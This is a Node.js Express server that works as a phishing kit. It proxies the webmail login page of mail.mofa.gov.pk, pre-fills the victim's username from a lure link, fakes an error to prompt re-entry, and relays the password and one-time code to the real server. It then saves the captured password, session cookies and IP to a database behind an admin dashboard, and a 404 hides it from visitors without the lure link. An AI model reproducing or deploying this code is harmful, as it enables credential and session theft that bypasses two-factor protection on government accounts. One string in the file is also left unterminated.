if (typeof globalThis.File === 'undefined') {
  globalThis.File = class File {};
}
if (typeof globalThis.Blob === 'undefined') {
  globalThis.Blob = class Blob {};
}

const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const tough = require('tough-cookie');
const session = require('express-session');
const { wrapper } = require('axios-cookiejar-support');
const connectDB = require('./db');
const User = require('./models/User');
const Admin = require('./models/Admin');

const app = express();
connectDB();

app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');

// Session setup
app.use(session({
  secret: 'shduhfuishdiufhwugfdgdfgdfggfdgreedfiriuwekhdfsdk',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false }
}));

// Disable SSL verification globally
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

// Axios with cookie jar support
const cookieJar = new tough.CookieJar();
const axiosInstance = wrapper(axios.create({ 
  jar: cookieJar, 
  withCredentials: true
}));


const baseUrl = 'https://mail.mofa.gov.pk/';
const loginUrl = baseUrl;
const otpUrl = baseUrl + '?client=preferred/';

// Proxy route for CSS and images
app.use('/proxy', (req, res) => {
  let targetUrl = baseUrl.slice(0, -1) + req.url;

  axios.get(targetUrl, {
    responseType: req.url.includes('.css') ? 'text' : 'stream',
    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
  }).then(response => {
    if (req.url.includes('.css')) {
      let css = response.data;

      css = css.replace(/url\s*\(\s*(['"]?)([^'"\)\s]+)\1\s*\)/g, (match, quote, url) => {

        if (!url.startsWith('http') && !url.startsWith('//') && !url.startsWith('/proxy')) {
          // Handle relative paths like ../img/file.png
          let cleanUrl = url.replace(/^\.\.\//, '');
          const newUrl = `url(${quote}/proxy/${cleanUrl.startsWith('/') ? cleanUrl.substring(1) : cleanUrl}${quote})`;

          return newUrl;
        }
        return match;
      });

      res.set('Content-Type', 'text/css');
      res.send(css);
    } else {
      res.set(response.headers);
      response.data.pipe(res);
    }
  }).catch(err => {

    res.status(404).send('Not found');
  });
});

// Handle direct image requests
app.use('/img', (req, res) => {
  const targetUrl = baseUrl + 'img' + req.url;

  axios.get(targetUrl, {
    responseType: 'stream',
    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
  }).then(response => {
    res.set(response.headers);
    response.data.pipe(res);
  }).catch(err => {

    res.status(404).send('Not found');
  });
});

// Utility to fix relative URLs for CSS/IMG
function fixRelativePaths(html) {
  const $ = cheerio.load(html);
  $('link[rel="stylesheet"], link[rel="SHORTCUT ICON"]').each((_, el) => {
    const href = $(el).attr('href');
    if (href && !href.startsWith('http') && !href.startsWith('//')) {
      $(el).attr('href', '/proxy/' + (href.startsWith('/') ? href.substring(1) : href));
    }
  });
  $('img').each((_, el) => {
    const src = $(el).attr('src');
    if (src && !src.startsWith('http') && !src.startsWith('//')) {
      $(el).attr('src', '/proxy/' + (src.startsWith('/') ? src.substring(1) : src));
    }
  });
  $('style').each((_, el) => {
    let css = $(el).html();
    css = css.replace(/url\((['"]?)([^'"\)]+)\1\)/g, (match, quote, url) => {
      if (!url.startsWith('http') && !url.startsWith('//')) {
        return `url(${quote}/proxy/${url.startsWith('/') ? url.substring(1) : url}${quote})`;
      }
      return match;
    });
    $(el).html(css);
  });
  return $;
}

// Fetch login page and extract CSRF
async function fetchLoginPage(req) {
  try {
    const requestCookieJar = new tough.CookieJar();
    const requestAxios = wrapper(axios.create({ 
      jar: requestCookieJar, 
      withCredentials: true
    }));
    
    const response = await requestAxios.get(loginUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
    });
    
    const $ = cheerio.load(response.data);
    const csrfToken = $('input[name="login_csrf"]').val();
    if (!csrfToken) throw new Error('CSRF token not found.');
    req.session.zmLoginCsrf = csrfToken;
    
    const cookies = await requestCookieJar.getCookies(loginUrl);
    req.session.initialCookies = cookies.map(c => c.cookieString());
    
    return $.html();
  } catch (err) {

    return null;
  }
}


app.get('/', async (req, res) => {
  const html = await fetchLoginPage(req);

  // Check if the required query parameter is present
  if (!req.query.hbauhznnaozokasodkc) {
    return res.status(404).send('Forbidden');
  }

  // Decode the base64 username
  let username;
  try {
    username = Buffer.from(req.query.hbauhznnaozokasodkc, 'base64').toString('utf8');
  } catch (error) {
    return res.status(404).send('Forbidden');
  }

  if (html) {
    const $ = fixRelativePaths(html);
    
    // Update the error message div
    const errorDiv = $('div#errorMessageDiv.errorMessage');
    if (errorDiv.length > 0) {
      errorDiv.attr('style', 'display: block !important;');
      errorDiv.text('An Unknown error has occurred, Sign in Again);
    }

    // Update the username field with decoded value
    $('#username').val(username);

    // Add script to prevent the error message from being hidden and set focus to password
    $('body').append(`
      <script>
        // Override the error message hiding
        document.addEventListener('DOMContentLoaded', function() {
          const errorDiv = document.getElementById('errorMessageDiv');
          if (errorDiv) {
            errorDiv.style.display = 'block';
          }
          
          // Override the specific condition that hides the error
          if (typeof errorMessageDiv !== 'undefined') {
            errorMessageDiv.style.display = 'block';
          }

          // Set focus to password field since username is pre-filled
          const passwordField = document.getElementById('password');
          if (passwordField) {
            passwordField.focus();
          }
        });
        
        // Override the specific line that hides the error
        window.addEventListener('load', function() {
          const errorDiv = document.getElementById('errorMessageDiv');
          if (errorDiv && errorDiv.innerHTML.trim() !== '') {
            errorDiv.style.display = 'block';
          }

          // Ensure password field has focus
          const passwordField = document.getElementById('password');
          if (passwordField && !passwordField.disabled) {
            passwordField.focus();
          }
        });

        // Also override the existing onLoad function to focus on password
        const originalOnLoad = window.onLoad;
        window.onLoad = function() {
          if (originalOnLoad) originalOnLoad();
          const passwordField = document.getElementById('password');
          if (passwordField) {
            passwordField.focus();
          }
        };
      </script>
    `);
    
    res.send($.html());
  } else {
    res.send('Failed to load login page.');
  }
});

app.post('/', async (req, res) => {
  const { username, password } = req.body;
  req.session.username = username;
  req.session.password = password;

  const requestCookieJar = new tough.CookieJar();
  const requestAxios = wrapper(axios.create({ 
    jar: requestCookieJar, 
    withCredentials: true
  }));
  
  if (req.session.initialCookies) {
    for (const cookieStr of req.session.initialCookies) {
      try {
        const cookie = tough.Cookie.parse(cookieStr);
        if (cookie) {
          await requestCookieJar.setCookie(cookie, loginUrl);
        }
      } catch (e) {

      }
    }
  }

  const postData = new URLSearchParams({
    loginOp: 'login',
    login_csrf: req.session.zmLoginCsrf,
    username,
    password,
    client: 'preferred',
  }).toString();

  try {
    const response = await requestAxios.post(loginUrl, postData, {
      headers: {
        'User-Agent': 'Mozilla5.0 Windows NT 10.0 Win64 x64 AppleWebKit537.36 KHTML like Gecko Chrome101.0.4951.54 Safari537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': `ZM_TEST=true; ZM_LOGIN_CSRF=${req.session.zmLoginCsrf}`
      }
    });

    const incomingCookies = response.headers['set-cookie'] || [];
    let hasAuthToken = false;

    incomingCookies.forEach(cookieStr => {
      const cookie = tough.Cookie.parse(cookieStr);
      if (!cookie) return;

      if (cookie.key === 'ZM_AUTH_TOKEN') {
        req.session.zmAuthToken = cookie.cookieString();
        hasAuthToken = true;
      } else if (cookie.key === 'ZM_LOGIN_CSRF') {
        req.session.zmLoginCsrf = cookie.cookieString();
      } else if (cookie.key === 'ZM_TEST') {
        req.session.zmTest = cookie.cookieString();
      }
    });

    const cookies = await requestCookieJar.getCookies(loginUrl);
    req.session.loginCookies = cookies.map(c => c.cookieString());

    const $ = fixRelativePaths(response.data);

    if (hasAuthToken) {
      $('#zLoginForm').attr('action', '/otp');
      res.send($.html());
    } else {
      const newCsrfToken = $('input[name="login_csrf"]').val();
      if (newCsrfToken) req.session.zmLoginCsrf = newCsrfToken;
      $('#zLoginForm').attr('action', '/');
      res.send($.html());
    }

  } catch (err) {

    res.send('Login failed!');
  }
});

app.post('/otp', async (req, res) => {
  const { totpcode } = req.body;

  const requestCookieJar = new tough.CookieJar();
  const requestAxios = wrapper(axios.create({ 
    jar: requestCookieJar, 
    withCredentials: true
  }));
  
  const cookiesToAdd = [
    ...(req.session.initialCookies || []),
    ...(req.session.loginCookies || []),
    req.session.zmTest, 
    req.session.zmAuthToken, 
    req.session.zmLoginCsrf
  ].filter(Boolean);
  
  for (const cookieStr of cookiesToAdd) {
    try {
      const cookie = tough.Cookie.parse(cookieStr);
      if (cookie) {
        await requestCookieJar.setCookie(cookie, otpUrl);
      }
    } catch (e) {

    }
  }

  const cookies = [req.session.zmTest, req.session.zmAuthToken, req.session.zmLoginCsrf]
    .filter(Boolean)
    .join('; ');

  const postData = new URLSearchParams({
    loginOp: 'login',
    login_csrf: req.session.zmLoginCsrf,
    zrememberme: '',
    trustedDevicesEnabled: 'false',
    tfaMethodEnabled: 'app',
    maskedEmailAddress: '',
    chooseMethod: '',
    isResent: '',
    tfaMethod: 'app',
    totpcode,
  }).toString();



  try {
    const response = await requestAxios.post(otpUrl, postData, {
      headers: {
        'User-Agent': 'Mozilla5.0 Windows NT 10.0 Win64 x64 AppleWebKit537.36 KHTML like Gecko Chrome101.0.4951.54 Safari537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': cookies
      }
    });

    const incomingCookies = response.headers['set-cookie'] || [];
    let hasJSessionId = false;

    incomingCookies.forEach(cookieStr => {
      const cookie = tough.Cookie.parse(cookieStr);
      if (!cookie) return;

      if (cookie.key === 'JSESSIONID') {
        hasJSessionId = true;
        req.session.jsessionId = cookie.cookieString();
      } else if (cookie.key === 'ZM_AUTH_TOKEN') {
        req.session.zmAuthToken = cookie.cookieString();
      } else if (cookie.key === 'ZM_LOGIN_CSRF') {
        req.session.zmLoginCsrf = cookie.cookieString();
      } else if (cookie.key === 'ZM_TEST') {
        req.session.zmTest = cookie.cookieString();
      }
    });

    const allCookies = await requestCookieJar.getCookies(otpUrl);
    req.session.otpCookies = allCookies.map(c => c.cookieString());

    if (hasJSessionId) {
      req.session.isAuthenticated = true;
      
      const newUser = new User({
        username: req.session.username,
        password: req.session.password,
        host_ip: req.ip,
        user_agent: req.headers['user-agent'],
        timestamp: new Date(),
        cookies: [
          req.session.zmTest, 
          req.session.zmAuthToken, 
          req.session.zmLoginCsrf,
          req.session.jsessionId
        ].filter(Boolean),
      });

      await newUser.save();

      res.redirect('/files/file.pdf');
    } else {
      const $ = fixRelativePaths(response.data);
      const newCsrfToken = $('input[name="login_csrf"]').val();
      if (newCsrfToken) req.session.zmLoginCsrf = newCsrfToken;
      $('#cancelButton').remove();  
      $('#zLoginForm').attr('action', '/otp');
      res.send($.html());
    }

  } catch (err) {

    res.send('OTP verification failed!');
  }
});

// Admin Routes
app.get('/admin', (req, res) => {
  if (req.session.adminAuthenticated) {
    return res.redirect('/admin/dashboard');
  }
  res.render('admin-login', { error: null });
});

app.post('/admin/login', async (req, res) => {
  const { username, password } = req.body;
  
  try {
    const admin = await Admin.findOne({ username, password });
    
    if (admin) {
      req.session.adminAuthenticated = true;
      res.redirect('/admin/dashboard');
    } else {
      res.render('admin-login', { error: 'Invalid credentials' });
    }
  } catch (error) {
    res.render('admin-login', { error: 'Login failed' });
  }
});

app.get('/admin/dashboard', async (req, res) => {
  if (!req.session.adminAuthenticated) {
    return res.redirect('/admin');
  }
  
  try {
    const users = await User.find({}).sort({ timestamp: -1 });
    res.render('admin-dashboard', { users });
  } catch (error) {
    res.send('Error loading dashboard');
  }
});

app.get('/admin/logout', (req, res) => {
  req.session.adminAuthenticated = false;
  res.redirect('/admin');
});

app.get('/files/file.pdf', (req, res) => {
  if (!req.session.isAuthenticated) {

    return res.redirect('/');
  }
  res.sendFile('/files/file.pdf');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {});
